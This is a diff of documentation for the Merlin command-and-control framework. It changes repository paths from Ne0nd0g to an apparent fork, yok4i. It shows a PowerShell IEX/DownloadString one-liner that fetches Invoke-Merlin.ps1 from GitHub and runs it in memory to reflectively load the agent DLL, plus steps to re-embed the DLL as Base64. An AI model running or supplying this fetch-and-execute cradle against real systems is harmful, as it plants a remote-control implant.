@@ -198,7 +198,7 @@ PowerSploit’s <a class="reference external" href="https://github.com/PowerShel
 used to reflectively load Merlin into memory. The script contains a
 Base64 encoded version of <code class="docutils literal notranslate"><span class="pre">merlin.dll</span></code>.</p>
 <p>An example of running the script from GitHub is:</p>
-<p><code class="docutils literal notranslate"><span class="pre">IEX</span> <span class="pre">(New-Object</span> <span class="pre">Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ne0nd0g/merlin/master/data/bin/dll/Invoke-Merlin.ps1');Invoke-Merlin</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">IEX</span> <span class="pre">(New-Object</span> <span class="pre">Net.WebClient).DownloadString('https://raw.githubusercontent.com/yok4i/merlin/master/data/bin/dll/Invoke-Merlin.ps1');Invoke-Merlin</span></code></p>
 <p>An example of running the script locally, using dot sourcing to read the script in, is:</p>
 <p><code class="docutils literal notranslate"><span class="pre">.</span> <span class="pre">C:\Invoke-Merlin.ps1;Invoke-Merlin</span></code></p>
 <p><strong>NOTE:</strong> Invoke-Merlin works on Windows 7 but fails on Windows 10</p>
@@ -225,7 +225,7 @@ original functionality. The only significant change is that the
 <h2>Update DLL<a class="headerlink" href="#update-dll" title="Permalink to this headline">¶</a></h2>
 <p>The following steps can be used to update the DLL in the script using PowerShell:</p>
 <ul class="simple">
-<li><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/yok4i/merlin/data/bin/dll/merlin.dll')</span></code></li>
 <li><code class="docutils literal notranslate"><span class="pre">$Base64String</span> <span class="pre">=</span> <span class="pre">[System.Convert]::ToBase64String($PEBytes)</span></code></li>
 <li><code class="docutils literal notranslate"><span class="pre">(Get-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1)</span> <span class="pre">|</span> <span class="pre">foreach-object</span> <span class="pre">{$_</span> <span class="pre">-replace</span> <span class="pre">'^\$global\:merlin</span> <span class="pre">\=</span> <span class="pre">(.*)',</span> <span class="pre">('$global:merlin</span> <span class="pre">=</span> <span class="pre">'</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;</span> <span class="pre">+</span> <span class="pre">$Base64String</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;)}</span> <span class="pre">|</span> <span class="pre">Set-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1</span></code></li>
 </ul>
